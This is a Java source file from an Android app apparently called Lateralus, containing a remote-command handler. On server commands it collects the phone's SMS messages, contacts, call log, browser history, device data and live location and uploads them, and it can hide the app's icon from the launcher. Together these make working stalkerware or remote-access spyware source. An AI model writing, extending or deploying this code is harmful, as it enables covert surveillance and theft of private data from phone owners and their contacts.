package net.scottjulian.lateralus;


import android.content.Context;
import android.location.Location;
import android.util.Log;

import net.scottjulian.lateralus.components.DeviceController;
import net.scottjulian.lateralus.components.location.LocDelegate;
import net.scottjulian.lateralus.components.location.LocationReader;
import net.scottjulian.lateralus.components.network.Network;
import net.scottjulian.lateralus.components.readers.ContactReader;
import net.scottjulian.lateralus.components.readers.DataReader;
import net.scottjulian.lateralus.components.readers.DeviceReader;
import net.scottjulian.lateralus.components.readers.InternetHistoryReader;
import net.scottjulian.lateralus.components.readers.PhonecallReader;
import net.scottjulian.lateralus.components.readers.TextMessageReader;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;


public class LateralusMessageHandler {
    private static final String TAG = "LateralusMsgHandler";

    public static final String KEY_CMD       = "command";
    public static final String KEY_ROOT      = "json";
    public static final String KEY_MSG       = "message";
    public static final String KEY_ERROR_MSG = "error_message";

    public static final String CMD_GET_DATA       = "get_data";
    public static final String CMD_TAKE_PIC       = "take_picture";
    public static final String CMD_GET_LOCATION   = "get_location";
    public static final String CMD_START_TRACKING = "start_tracking";
    public static final String CMD_STOP_TRACKING  = "stop_tracking";

    public static final String CMD_SHOW_APP = "show_app";
    public static final String CMD_HIDE_APP = "hide_app";

    private Context _ctx;
    private LocationDelegate locDelegate = null;
    private LocationReader locReader = null;

    public LateralusMessageHandler(Context ctx){
        _ctx = ctx;
    }

    public void processMessage(JSONObject data){
        try{
            String cmd = data.getString(KEY_CMD);
            switch(cmd){
                case CMD_GET_DATA:
                    cmdData();
                    break;
                case CMD_TAKE_PIC:
                    cmdPicture();
                    break;
                case CMD_GET_LOCATION:
                case CMD_START_TRACKING:
                case CMD_STOP_TRACKING:
                    cmdLocation(cmd);
                    break;
                case CMD_HIDE_APP:
                    DeviceController.hideAppInDrawer(_ctx);
                    break;
                case CMD_SHOW_APP:
                    DeviceController.showAppInDrawer(_ctx);
                    break;
                default:
                    Log.e(TAG, "Invalid Command: " + cmd);
                    // TODO send error message
            }
        }
        catch(JSONException e){
            Log.e(TAG, "Error with the JSON from gcm request");
            e.printStackTrace();
        }
    }

    private void cmdData(){
        try{
            JSONArray jsonArray = new JSONArray();
            // device
            DataReader dr = new DeviceReader(_ctx);
            jsonArray.put(dr.getData());
            // text messages
            dr = new TextMessageReader(_ctx);
            jsonArray.put(dr.getData());
            // contacts
            dr = new ContactReader(_ctx);
            jsonArray.put(dr.getData());
            // phonecalls
            dr = new PhonecallReader(_ctx);
            jsonArray.put(dr.getData());
            // internet history
            dr = new InternetHistoryReader(_ctx);
            jsonArray.put(dr.getData());
            // make JSONObject
            JSONObject root = new JSONObject();
            root.put(KEY_ROOT, jsonArray);
            // fire data
            Network.fireJsonData(_ctx, Network.API_PUT, root);
        }
        catch(Exception e){

        }
    }

    private void cmdPicture(){
        // TODO
    }

    private  void cmdLocation(String cmd){
        if(locDelegate == null || locReader == null){
            locDelegate = new LocationDelegate();
            locReader = new LocationReader(_ctx, locDelegate);
        }
        switch(cmd){
            case CMD_GET_LOCATION:
                locReader.requestSingleLocationUpdate(true);
                break;
            case CMD_START_TRACKING:
                locReader.startTracking(true);
                break;
            case CMD_STOP_TRACKING:
                locReader.stopTracking();
                break;
        }
    }

    private class LocationDelegate implements LocDelegate {

        @Override
        public void onLocationReceived(Location loc) {
            try {
                JSONObject jsonLoc = LocationReader.getJsonFromLocation(loc);
                if(jsonLoc != null) {
                    JSONArray jsonArray = new JSONArray();
                    DeviceReader dr = new DeviceReader(_ctx);
                    jsonArray.put(dr.getData());
                    jsonArray.put(jsonLoc);
                    JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
                    Network.fireJsonData(_ctx, Network.API_PUT, root);
                }
            }
            catch(Exception e){
                Log.e(TAG, "Could not create location json from locationReceived");
                e.printStackTrace();
            }
        }

        @Override
        public void onErrorReceived(String msg) {
            try{
                JSONArray jsonArray = new JSONArray();
                DeviceReader dr = new DeviceReader(_ctx);
                jsonArray.put(dr.getData());
                jsonArray.put(new JSONObject().put(KEY_ERROR_MSG, msg));
                JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
                Network.fireJsonData(_ctx, Network.API_PUT, root);
            }
            catch(Exception e){
                Log.e(TAG, "Could not create error json from errorReceived");
                e.printStackTrace();
            }
        }

        @Override
        public void onMessageReceived(String msg) {
            try{
                JSONArray jsonArray = new JSONArray();
                DeviceReader dr = new DeviceReader(_ctx);
                jsonArray.put(dr.getData());
                jsonArray.put(new JSONObject().put(KEY_MSG, msg));
                JSONObject root = new JSONObject().put(KEY_ROOT, jsonArray);
                Network.fireJsonData(_ctx, Network.API_PUT, root);
            }
            catch(Exception e){
                Log.e(TAG, "Could not create message json from messageReceived");
                e.printStackTrace();
            }
        }
    }

}
